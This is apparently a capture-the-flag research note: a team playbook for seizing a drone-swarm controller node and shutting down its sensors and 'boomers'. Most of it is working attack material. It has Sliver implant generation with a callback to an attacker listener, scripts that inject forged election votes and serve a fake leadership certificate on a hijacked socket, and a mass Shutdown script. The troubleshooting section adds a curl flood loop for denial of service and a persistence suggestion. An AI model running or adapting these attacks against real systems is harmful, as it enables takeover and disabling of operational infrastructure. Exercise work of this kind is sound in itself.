---
tags:
  - research/viceroy/ctf
lecture:
date:
related:
aliases:
created: 2026-03-28T18:25
modified: 2026-04-07T12:20
---

# GILDED GUARDIAN — Controller Takeover & Swarm Kill Playbook

## Team Roles

| Role | Callsign | Responsibility |
|---|---|---|
| Operator 1 | RECON | Gather config, identify all UUIDs, socket paths, peer IPs. Feed data to PAYLOAD. |
| Operator 2 | PAYLOAD | Pre-stage all Python scripts on the attack station. Adapt scripts with live data from RECON. |
| Operator 3 | EXECUTE | Run scripts on the target node via Sliver. Monitor results, troubleshoot failures. |

All three share the same Sliver console. Only one person drives at a time. Handoffs are explicit.

---

## Pre-Execution Assumptions

- Sliver server is running on the attack station with an active HTTP listener
- `golden.exe` is an ARM64 Linux Sliver implant at `/var/www/golden.exe`
- The fetcher service on target nodes pulls from our listener and executes the binary
- We will land on a controller node running NixOS ARM64
- Userspace binaries are at `/run/current-system/sw/bin/`
- Writable staging directory: `/tmp/` (world-writable per filesystem listing)
- Sliver `upload` puts files onto the target; `execute` runs them

---

## Phase 0 — Access & Session Validation

**Owner: EXECUTE**

### 0.1 Confirm Listener

```text
sliver > jobs
```

Verify HTTP listener is active. If not:

```text
sliver > http -l 0.0.0.0 -p <PORT>
```

### 0.2 Verify Implant Served

From the attack station shell (not Sliver):

```bash
ls -la /var/www/golden.exe
file /var/www/golden.exe
```

Must be ARM64 ELF. If missing, regenerate:

```text
sliver > generate --http <ATTACK_IP>:<PORT> --os linux --arch arm64 --save /var/www/golden.exe
```

generate -G --http 172.21.0.100:8888 --os linux --arch arm64 --save /var/www/golden.exe

### 0.3 Wait for Callback

The target fetcher service restarts every 5 seconds on failure. Watch:

```text
sliver > sessions
```

Once a new session appears, interact:

```text
sliver > use <SESSION_ID>
```

### 0.4 Validate Environment

```text
whoami
pwd
execute /run/current-system/sw/bin/uname -a
```

Confirm we’re on a controller node:

```text
ls /run/commsDaemon
ls /run/electionDaemon
ls /run/hwDaemon
```

All three directories should exist. If only `commsDaemon` and `hwDaemon` exist without `electionDaemon`, this is a sensor or boomer node — we need a different target.

**Handoff to RECON.**

---

## Phase 1 — Configuration Extraction

**Owner: RECON**

### 1.1 Find Config Path

The config path is passed via environment variable in the systemd unit. Check the unit files:

```text
execute /run/current-system/sw/bin/cat /etc/systemd/system/commsDaemon.service
execute /run/current-system/sw/bin/cat /etc/systemd/system/controlDaemon.service
execute /run/current-system/sw/bin/cat /etc/systemd/system/electionDaemon.service
execute /run/current-system/sw/bin/cat /etc/systemd/system/hwDaemon.service
```

Look for `Environment="CONTROLLER_CONFIG_PATH=…"` in each unit. Common location: `/etc/controller/config.yaml`.

Also check for `CONTROLLER_MISSION_PATH` in the controlDaemon unit.

### 1.2 Dump the Config

```text
execute /run/current-system/sw/bin/cat <CONTROLLER_CONFIG_PATH>
```

### 1.3 Extract and Record All Values

Copy the YAML output and fill in this table. **PAYLOAD needs this data.**

```text
┌────────────────────────┬──────────────────────────────────┐
│ Field                  │ Value                            │
├────────────────────────┼──────────────────────────────────┤
│ Our Node UUID (id)     │                                  │
│ comms_socket_path      │                                  │
│ election_socket_path   │                                  │
│ listen_port            │                                  │
│ key_path               │                                  │
│ verify_signatures      │                                  │
├────────────────────────┼──────────────────────────────────┤
│ Peer Controller 1 UUID │                                  │
│ Peer Controller 1 IP   │                                  │
│ Peer Controller 2 UUID │                                  │
│ Peer Controller 2 IP   │                                  │
│ Peer Controller 3 UUID │                                  │
│ Peer Controller 3 IP   │                                  │
│ Peer Controller 4 UUID │                                  │
│ Peer Controller 4 IP   │                                  │
├────────────────────────┼──────────────────────────────────┤
│ Sensor 1 UUID          │                                  │
│ Sensor 2 UUID          │                                  │
│ Sensor 3 UUID          │                                  │
│ Sensor 4 UUID          │                                  │
│ Sensor 5 UUID          │                                  │
│ Sensor 6 UUID          │                                  │
├────────────────────────┼──────────────────────────────────┤
│ Boomer 1 UUID          │                                  │
│ Boomer 2 UUID          │                                  │
│ ... (up to 15)         │                                  │
├────────────────────────┼──────────────────────────────────┤
│ Total peer controllers │                                  │
│ Quorum needed          │ (total controllers + 1) / 2      │
│                        │ rounded up                       │
│ Total sensors          │                                  │
│ Total boomers          │                                  │
│ Total workers          │                                  │
└────────────────────────┴──────────────────────────────────┘
```

### 1.4 Identify Running Processes

```text
ps
```

Record PIDs for:
- `commsDaemon` or `comms` process
- `electionDaemon` or `election` process
- `controlDaemon` or `control` process
- `hwDaemon` or `hw` process

```txt
921 1 comms 
922 1 control 
923 1 election
924 1 auto-puller 
925 1 hw
```

### 1.5 Check Current Leadership

```text
execute /run/current-system/sw/bin/python3 -c "
import socket, json, sys
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.connect('/run/electionDaemon/election.sock')
    data = json.loads(s.recv(409600).decode())
    s.close()
    if len(data.get('endorsements', [])) > 0:
        print('WE ARE LEADER')
        print(json.dumps(data, indent=2))
    else:
        print('NOT LEADER - empty COA')
except Exception as e:
    print(f'ERROR: {e}')
"
```

**If `WE ARE LEADER`**: skip to Phase 4, PAYLOAD writes `kill_swarm.py` directly.

**If `NOT LEADER`**: continue to Phase 2.

**Handoff to PAYLOAD with the completed data table.**

---

## Phase 2 — Payload Preparation (Attack Station)

**Owner: PAYLOAD**

All scripts are written on the attack station and uploaded to the target. Write them to a working directory on the attack station first.

Replace all placeholders (`__OUR_UUID__`, etc.) with values from RECON’s data table.

### 2.1 Script: `check_leader.py`

Purpose: Quick leadership check. Can be re-run at any time.

```python
#!/usr/bin/env python3
"""check_leader.py - Query election socket for leadership status."""
import socket
import json
import sys

ELECTION_SOCK = "__ELECTION_SOCKET_PATH__"

try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(ELECTION_SOCK)
    raw = s.recv(409600).decode()
    s.close()
    coa = json.loads(raw)
    endorsements = coa.get("endorsements", [])
    if len(endorsements) > 0:
        print(f"LEADER: YES ({len(endorsements)} endorsements)")
        for e in endorsements:
            print(
                f"  endorser={e.get('endorser', '?')}"
                f"  expires={e.get('expiration', '?')}"
            )
        print("\nFull COA:")
        print(json.dumps(coa, indent=2))
    else:
        print("LEADER: NO")
except Exception as e:
    print(f"ERROR: {e}", file=sys.stderr)
    sys.exit(1)
```

### 2.2 Script: `sniff_comms.py`

Purpose: Connect to comms socket, observe inbound traffic to learn current election term and identify current leader. Run for 10-15 seconds then kill.

```python
#!/usr/bin/env python3
"""sniff_comms.py - Listen on comms socket for election traffic."""
import socket
import json
import sys
import time
import base64

COMMS_SOCK = "__COMMS_SOCKET_PATH__"

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(COMMS_SOCK)
s.settimeout(2.0)

print("Listening on comms socket for 15 seconds...")
deadline = time.time() + 15
buf = b""

while time.time() < deadline:
    try:
        chunk = s.recv(65536)
        if not chunk:
            break
        buf += chunk
        # Try to decode JSON objects from buffer
        # Messages may be concatenated
        text = buf.decode("utf-8", errors="replace")
        # Attempt to parse each line/object
        for line in text.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            try:
                msg = json.loads(line)
                mt = msg.get("msg_type", "")
                src = msg.get("source", "?")
                dst = msg.get("destination", "?")
                print(f"\n[{mt}] src={src} dst={dst}")
                if mt.startswith("Election:"):
                    try:
                        payload = json.loads(
                            base64.b64decode(
                                msg.get("msg", "")
                            ).decode()
                        )
                        print(f"  payload: {json.dumps(payload)}")
                    except Exception:
                        print(f"  msg (raw): {msg.get('msg', '')[:80]}")
                buf = b""
            except json.JSONDecodeError:
                pass
    except socket.timeout:
        continue
    except Exception as e:
        print(f"Error: {e}")
        break

s.close()
print("\nDone sniffing.")
```

### 2.3 Script: `win_election.py`

Purpose: Inject high-term vote requests, capture responses, then request endorsements. This is the core attack.

```python
#!/usr/bin/env python3
"""win_election.py - Force election win via comms socket injection."""
import socket
import json
import sys
import time
import base64
import threading

# ============ FILL THESE IN ============
OUR_UUID = "__OUR_UUID__"
COMMS_SOCK = "__COMMS_SOCKET_PATH__"
ELECTION_SOCK = "__ELECTION_SOCKET_PATH__"
HIGH_TERM = 99999

PEER_CONTROLLERS = [
    # {"uuid": "...", "ip": "http://..."},
    __PEER_LIST__
]
# =======================================

TOTAL_CONTROLLERS = len(PEER_CONTROLLERS) + 1  # +1 for us
QUORUM = (TOTAL_CONTROLLERS // 2) + 1

print(f"Our UUID: {OUR_UUID}")
print(f"Peers: {len(PEER_CONTROLLERS)}")
print(f"Total controllers: {TOTAL_CONTROLLERS}")
print(f"Quorum needed: {QUORUM}")
print(f"Using term: {HIGH_TERM}")
print()

def b64_json(obj):
    """Encode a dict as base64url JSON for the msg field."""
    return base64.b64encode(json.dumps(obj).encode()).decode()

def send_msg(sock, destination, msg_type, payload_dict):
    """Send a transmission through the comms socket."""
    msg = {
        "source": OUR_UUID,
        "destination": destination,
        "msg": b64_json(payload_dict),
        "msg_type": msg_type,
    }
    sock.sendall((json.dumps(msg) + "\n").encode())

# ---- Step 1: Connect to comms socket ----
print("[*] Connecting to comms socket...")
comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
comms.connect(COMMS_SOCK)
comms.settimeout(2.0)

# ---- Step 2: Send Vote Requests ----
print("[*] Sending Election:Vote Request to all peers...")
vote_payload = {"leader": OUR_UUID, "term": HIGH_TERM}

for peer in PEER_CONTROLLERS:
    send_msg(
        comms,
        peer["uuid"],
        "Election:Vote Request",
        vote_payload,
    )
    print(f"  -> Vote Request sent to {peer['uuid'][:8]}...")

# ---- Step 3: Collect Vote Responses ----
print(f"\n[*] Waiting for vote responses (need {QUORUM - 1} peer votes)...")
votes_received = 0
endorsements_received = []
deadline = time.time() + 15
buf = b""

while time.time() < deadline:
    try:
        chunk = comms.recv(65536)
        if not chunk:
            break
        buf += chunk
        text = buf.decode("utf-8", errors="replace")
        for line in text.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            try:
                msg = json.loads(line)
                mt = msg.get("msg_type", "")

                if mt == "Election:Vote Response":
                    try:
                        payload = json.loads(
                            base64.b64decode(msg["msg"]).decode()
                        )
                        granted = payload.get("vote_granted", False)
                        term = payload.get("term", -1)
                        src = msg.get("source", "?")
                        print(
                            f"  <- Vote Response from"
                            f" {src[:8]}..."
                            f" granted={granted}"
                            f" term={term}"
                        )
                        if granted:
                            votes_received += 1
                    except Exception as e:
                        print(f"  <- Vote Response (decode err: {e})")

                elif mt == "Election:Endorsement Response":
                    try:
                        payload = json.loads(
                            base64.b64decode(msg["msg"]).decode()
                        )
                        endorsements_received.append(
                            payload.get("endorsement", {})
                        )
                        src = msg.get("source", "?")
                        print(
                            f"  <- Endorsement from {src[:8]}..."
                        )
                    except Exception as e:
                        print(
                            f"  <- Endorsement Response"
                            f" (decode err: {e})"
                        )

                elif mt.startswith("Election:"):
                    print(
                        f"  <- {mt} from"
                        f" {msg.get('source', '?')[:8]}..."
                    )

                buf = b""
            except json.JSONDecodeError:
                pass
    except socket.timeout:
        # +1 for self-vote
        if votes_received + 1 >= QUORUM:
            print(f"\n[+] QUORUM REACHED"
                  f" ({votes_received} peer votes + self)")
            break
        continue

total_votes = votes_received + 1  # +1 for self
print(f"\n[*] Total votes: {total_votes}"
      f" (need {QUORUM})")

if total_votes < QUORUM:
    print("[!] QUORUM NOT REACHED. Election failed.")
    print("[!] Try increasing HIGH_TERM or check if"
          " peers are reachable.")
    comms.close()
    sys.exit(1)

# ---- Step 4: Request Endorsements ----
print("\n[*] Sending Election:Endorsement Request"
      " to all peers...")
endorse_payload = {"term": HIGH_TERM}

for peer in PEER_CONTROLLERS:
    send_msg(
        comms,
        peer["uuid"],
        "Election:Endorsement Request",
        endorse_payload,
    )
    print(f"  -> Endorsement Request sent to"
          f" {peer['uuid'][:8]}...")

# ---- Step 5: Collect Endorsements ----
print("\n[*] Waiting for endorsement responses...")
deadline = time.time() + 15

while time.time() < deadline:
    try:
        chunk = comms.recv(65536)
        if not chunk:
            break
        buf += chunk
        text = buf.decode("utf-8", errors="replace")
        for line in text.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            try:
                msg = json.loads(line)
                mt = msg.get("msg_type", "")
                if mt == "Election:Endorsement Response":
                    try:
                        payload = json.loads(
                            base64.b64decode(msg["msg"]).decode()
                        )
                        e = payload.get("endorsement", {})
                        if e:
                            endorsements_received.append(e)
                            print(
                                f"  <- Endorsement from"
                                f" {e.get('endorser', '?')[:8]}..."
                            )
                    except Exception:
                        pass
                buf = b""
            except json.JSONDecodeError:
                pass
    except socket.timeout:
        if len(endorsements_received) >= QUORUM - 1:
            break
        continue

comms.close()

print(f"\n[*] Collected {len(endorsements_received)}"
      f" endorsements")

if len(endorsements_received) == 0:
    print("[!] No endorsements collected."
          " Cannot build COA.")
    sys.exit(1)

# ---- Step 6: Save COA for later use ----
coa = {"endorsements": endorsements_received}

with open("/tmp/captured_coa.json", "w") as f:
    json.dump(coa, f, indent=2)

print("[+] COA saved to /tmp/captured_coa.json")
print(f"[+] Election win complete. We are term"
      f" {HIGH_TERM} leader.")

# ---- Step 7: Check if real election daemon updated ----
print("\n[*] Checking if real election daemon"
      " reflects leadership...")
try:
    es = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    es.connect(ELECTION_SOCK)
    live_coa = json.loads(es.recv(409600).decode())
    es.close()
    if len(live_coa.get("endorsements", [])) > 0:
        print("[+] REAL election daemon shows us as leader!")
        print("[+] No socket replacement needed.")
    else:
        print("[-] Real election daemon still shows"
              " not-leader.")
        print("[-] Socket replacement will be needed"
              " (run replace_election_socket.py)")
except Exception as e:
    print(f"[!] Could not check election socket: {e}")
```

### 2.4 Script: `replace_election_socket.py`

Purpose: Kill the real election daemon and serve our own COA. **Only needed if Phase 2.3 reports the real daemon didn’t update.**

```python
#!/usr/bin/env python3
"""replace_election_socket.py - Serve fake COA on election socket."""
import socket
import json
import os
import sys
import signal

ELECTION_SOCK = "__ELECTION_SOCKET_PATH__"

# Load the COA we captured during election
try:
    with open("/tmp/captured_coa.json") as f:
        coa = json.load(f)
except FileNotFoundError:
    print("[!] /tmp/captured_coa.json not found."
          " Run win_election.py first.")
    sys.exit(1)

if len(coa.get("endorsements", [])) == 0:
    print("[!] COA has no endorsements. Cannot serve.")
    sys.exit(1)

print(f"[*] Loaded COA with"
      f" {len(coa['endorsements'])} endorsements")

# Remove existing socket file
try:
    os.unlink(ELECTION_SOCK)
    print(f"[*] Removed existing socket at {ELECTION_SOCK}")
except FileNotFoundError:
    print(f"[*] No existing socket at {ELECTION_SOCK}")
except PermissionError:
    print(f"[!] Cannot remove {ELECTION_SOCK} -"
          " need to kill election daemon first")
    print("[!] Use Sliver 'terminate <PID>' on the"
          " election daemon process")
    sys.exit(1)

# Bind our server
server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind(ELECTION_SOCK)
os.chmod(ELECTION_SOCK, 0o777)
server.listen(10)

coa_bytes = json.dumps(coa).encode()
print(f"[+] Fake election socket serving on {ELECTION_SOCK}")
print("[+] Ctrl+C or kill this process when done")

while True:
    try:
        conn, _ = server.accept()
        conn.sendall(coa_bytes)
        conn.close()
    except KeyboardInterrupt:
        break
    except Exception as e:
        print(f"[!] Error: {e}")
        continue

server.close()
```

### 2.5 Script: `kill_swarm.py`

Purpose: Queue Shutdown transmissions for every worker.

```python
#!/usr/bin/env python3
"""kill_swarm.py - Send Shutdown to all sensors and boomers."""
import socket
import json
import sys
import base64
import time

# ============ FILL THESE IN ============
OUR_UUID = "__OUR_UUID__"
COMMS_SOCK = "__COMMS_SOCKET_PATH__"
ELECTION_SOCK = "__ELECTION_SOCKET_PATH__"

SENSOR_UUIDS = [
    __SENSOR_LIST__
]

BOOMER_UUIDS = [
    __BOOMER_LIST__
]
# =======================================

ALL_WORKERS = SENSOR_UUIDS + BOOMER_UUIDS

# ---- Step 1: Confirm leadership ----
print("[*] Confirming leadership...")
try:
    es = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    es.connect(ELECTION_SOCK)
    coa = json.loads(es.recv(409600).decode())
    es.close()
    if len(coa.get("endorsements", [])) == 0:
        print("[!] NOT LEADER. Cannot send Shutdown.")
        print("[!] Run win_election.py first.")
        sys.exit(1)
    print(f"[+] Leader confirmed"
          f" ({len(coa['endorsements'])} endorsements)")
except Exception as e:
    print(f"[!] Cannot check leadership: {e}")
    sys.exit(1)

# ---- Step 2: Connect to comms socket ----
print("[*] Connecting to comms socket...")
comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
comms.connect(COMMS_SOCK)

# ---- Step 3: Queue Shutdown for each worker ----
print(f"[*] Sending Shutdown to {len(ALL_WORKERS)} workers...")
shutdown_payload = base64.b64encode(b"{}").decode()

for worker_uuid in ALL_WORKERS:
    msg = {
        "source": OUR_UUID,
        "destination": worker_uuid,
        "msg": shutdown_payload,
        "msg_type": "Shutdown",
        "authority": coa,
    }
    comms.sendall((json.dumps(msg) + "\n").encode())
    print(f"  -> Shutdown queued for {worker_uuid[:8]}...")

# Small delay to let comms process the queue
time.sleep(1)

# ---- Step 4: Also try plain JSON msg (not base64) ----
# In case worker comms expects plain JSON for non-election
print(f"\n[*] Sending backup Shutdown with plain msg"
      f" encoding...")
for worker_uuid in ALL_WORKERS:
    msg = {
        "source": OUR_UUID,
        "destination": worker_uuid,
        "msg": "{}",
        "msg_type": "Shutdown",
        "authority": coa,
    }
    comms.sendall((json.dumps(msg) + "\n").encode())

comms.close()

print(f"\n[+] Shutdown queued for {len(ALL_WORKERS)}"
      f" workers")
print(f"    Sensors: {len(SENSOR_UUIDS)}")
print(f"    Boomers: {len(BOOMER_UUIDS)}")
print("[*] Workers will die on their next poll"
      " cycle (~1-2 seconds)")
print("[+] SWARM KILL COMPLETE")
```

**Handoff to EXECUTE once all scripts are populated with live data from RECON.**

---

## Phase 3 — Upload Scripts to Target

**Owner: EXECUTE**

### 3.1 Upload All Scripts

From the Sliver session:

```text
upload /home/operator/check_leader.py /tmp/check_leader.py
upload /home/operator/sniff_comms.py /tmp/sniff_comms.py
upload /home/operator/win_election.py /tmp/win_election.py
upload /home/operator/replace_election_socket.py /tmp/replace_election_socket.py
upload /home/operator/kill_swarm.py /tmp/kill_swarm.py
```

### 3.2 Verify Uploads

```text
ls /tmp/
```

Confirm all five `.py` files are present.

### 3.3 Make Executable (optional, shouldn’t Be needed)

```text
chmod 755 /tmp/check_leader.py
chmod 755 /tmp/sniff_comms.py
chmod 755 /tmp/win_election.py
chmod 755 /tmp/replace_election_socket.py
chmod 755 /tmp/kill_swarm.py
```

---

## Phase 4 — Execute the Election Takeover

**Owner: EXECUTE (RECON and PAYLOAD monitor and advise)**

### 4.1 Confirm Not Leader

```text
execute /run/current-system/sw/bin/python3 /tmp/check_leader.py
```

Expected: `LEADER: NO`

If `LEADER: YES` — skip to step 4.6.

### 4.2 (Optional) Sniff Current Election State

```text
execute /run/current-system/sw/bin/python3 /tmp/sniff_comms.py
```

Wait 15 seconds. Record observed term numbers. If no election traffic is visible, that’s fine — we’ll use term 99999 which will be higher than anything.

### 4.3 Win the Election

```text
execute /run/current-system/sw/bin/python3 /tmp/win_election.py
```

Watch output for:
- `QUORUM REACHED` — good, continue
- `QUORUM NOT REACHED` — see troubleshooting below
- `REAL election daemon shows us as leader!` — perfect, skip 4.4 and 4.5

### 4.4 (If Needed) Kill Election Daemon

Only if win_election.py reports “Real election daemon still shows not-leader.”

First, find the PID:

```text
ps
```

Look for a process named `election` or matching the election daemon binary path. Then:

```text
terminate <ELECTION_PID>
```

### 4.5 (If Needed) Start Fake Election Socket

This runs as a foreground blocking process. We need it to stay alive while we execute the kill. Use Sliver’s `execute` with output:

```text
execute -o /run/current-system/sw/bin/python3 /tmp/replace_election_socket.py &
```

If Sliver doesn’t support backgrounding, alternative approach — modify `replace_election_socket.py` to fork itself, or combine it with `kill_swarm.py` into a single script. **PAYLOAD should have a combined version ready.**

Practical workaround: just merge the socket server and kill logic into one script (see section 5 below).

### 4.6 Confirm Leadership

```text
execute /run/current-system/sw/bin/python3 /tmp/check_leader.py
```

Must show `LEADER: YES`. If not, stop and troubleshoot.

---

## Phase 5 — Kill the Swarm

**Owner: EXECUTE**

### 5.1 Send Shutdown

```text
execute /run/current-system/sw/bin/python3 /tmp/kill_swarm.py
```

Expected output:

```text
[+] Leader confirmed (X endorsements)
[*] Sending Shutdown to N workers...
  -> Shutdown queued for xxxxxxxx...
  ...
[+] SWARM KILL COMPLETE
```

### 5.2 Verify Workers Dying

Wait 5 seconds, then check if any workers are still polling by sniffing comms:

```text
execute /run/current-system/sw/bin/python3 /tmp/sniff_comms.py
```

If you see `Sensor:Get Tasks` or `Boomer:Get Tasks` messages, those workers haven’t picked up the Shutdown yet. Re-run `kill_swarm.py` — the Shutdown gets queued and delivered on next poll.

If no worker traffic after 15 seconds, all workers are dead.

### 5.3 Repeat for Next Swarm

Per the OPORD, there are 7 swarms. Each swarm may call back on a different controller node. Re-enter Phase 0 for each new callback.

---

## Contingency: Combined Script (If Socket Replacement Needed)

**Owner: PAYLOAD prepares this variant**

If we can’t background the fake election socket, use this combined script that replaces the socket, serves COA, and sends kills all in one:

```python
#!/usr/bin/env python3
"""takeover_and_kill.py - All-in-one: serve COA + kill swarm."""
import socket
import json
import os
import sys
import threading
import time
import base64

# ============ FILL THESE IN ============
OUR_UUID = "__OUR_UUID__"
COMMS_SOCK = "__COMMS_SOCKET_PATH__"
ELECTION_SOCK = "__ELECTION_SOCKET_PATH__"
SENSOR_UUIDS = [__SENSOR_LIST__]
BOOMER_UUIDS = [__BOOMER_LIST__]
# =======================================

ALL_WORKERS = SENSOR_UUIDS + BOOMER_UUIDS

with open("/tmp/captured_coa.json") as f:
    coa = json.load(f)

def serve_election_socket():
    """Background thread: serve COA on election socket."""
    try:
        os.unlink(ELECTION_SOCK)
    except (FileNotFoundError, PermissionError):
        pass
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(ELECTION_SOCK)
    os.chmod(ELECTION_SOCK, 0o777)
    srv.listen(10)
    coa_bytes = json.dumps(coa).encode()
    print("[*] Election socket server running in background")
    while True:
        try:
            conn, _ = srv.accept()
            conn.sendall(coa_bytes)
            conn.close()
        except Exception:
            continue

# Start election socket server in background
t = threading.Thread(target=serve_election_socket, daemon=True)
t.start()
time.sleep(1)

# Send Shutdown to all workers
print(f"[*] Queueing Shutdown for {len(ALL_WORKERS)} workers")
comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
comms.connect(COMMS_SOCK)

for wid in ALL_WORKERS:
    msg = {
        "source": OUR_UUID,
        "destination": wid,
        "msg": "{}",
        "msg_type": "Shutdown",
        "authority": coa,
    }
    comms.sendall((json.dumps(msg) + "\n").encode())
    print(f"  -> Shutdown -> {wid[:8]}...")

time.sleep(1)
comms.close()

# Keep serving the election socket for a while
# so comms daemon can validate leadership on
# worker poll responses
print("[+] Shutdown queued. Serving COA for 30s"
      " to handle worker polls...")
time.sleep(30)
print("[+] Done.")
```

---

## Troubleshooting

**“QUORUM NOT REACHED”**
- Peers may not be reachable from this node. Check: `execute /run/current-system/sw/bin/curl -s -o /dev/null -w "%{http_code}" <PEER_IP>`
- The comms daemon may not be forwarding our injected election traffic. Verify the comms socket is accepting our writes (no errors in output).
- Try a different term number. Possibly the implementation rejects very high terms. Try current_term + 10 instead.

**“Cannot remove election socket - permission error”**
- The election daemon owns the socket file. Use `terminate <PID>` in Sliver first.
- If we can’t kill it (wrong user), try: the `/run/electionDaemon/` directory is 0777, so we should be able to `rm` the socket file even if we don’t own it. Use `rm /run/electionDaemon/election.sock` in Sliver.

**“Workers not failing over to us”**
- Old leader may still be responding. DoS it:
  ```text
  execute /run/current-system/sw/bin/bash -c "for i in $(seq 1 100); do /run/current-system/sw/bin/curl -s <OLD_LEADER_IP>:10000 -d 'x' & done"
  ```
- Workers cycle through controllers on failure. With 5 controllers, worst case is 4 seconds of failed polls before they reach us.

**“Session dies mid-operation”**
- The fetcher service may restart and kill our implant process. Re-catch the callback, re-upload scripts. Files in `/tmp/` should survive if the node didn’t reboot.
- Consider uploading a persistence mechanism: copy the implant somewhere else and create a cron or systemd timer. Lower priority than the kill mission though.

**“msg encoding is wrong”**
- The vendor protocol doc says election payloads are base64-encoded, worker payloads are plain JSON. If Shutdown doesn’t work with one encoding, the scripts try both. If still failing, try with the `msg` field entirely omitted (the Shutdown payload is `{}` which is empty anyway).

**“verify_signatures is true”**
- If the config shows `verify_signatures: true`, our injected messages need valid signatures. The comms daemon signs outbound messages using the node’s private key before sending — so our election messages sent through the comms socket WILL be signed automatically. Inbound responses from peers will also be verified by our comms daemon. This should work transparently.

---

## Execution Checklist

```text
[ ] Phase 0: Session established on controller node
[ ] Phase 1: Config extracted, all UUIDs recorded
[ ] Phase 1: Leadership check completed
[ ] Phase 2: All scripts populated with live data
[ ] Phase 3: All scripts uploaded to /tmp/
[ ] Phase 4: Election won (or already leader)
[ ] Phase 4: Leadership confirmed via check_leader.py
[ ] Phase 5: Shutdown sent to all workers
[ ] Phase 5: Worker death verified (no poll traffic)
[ ] Repeat for next swarm callback
```
